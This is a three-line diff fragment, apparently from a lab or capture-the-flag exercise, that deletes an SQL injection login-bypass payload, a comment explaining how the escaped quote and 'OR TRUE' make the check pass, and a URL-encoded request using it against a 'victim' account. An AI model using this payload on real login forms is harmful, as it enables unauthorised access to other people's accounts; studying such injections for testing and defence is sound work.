@@ -1,3 +1,0 @@
-\' OR TRUE-- 
-^ backslash is an escape character, so will end the string and then true will evalute
-username=victim&password=%5C%27%20OR%20TRUE--%20
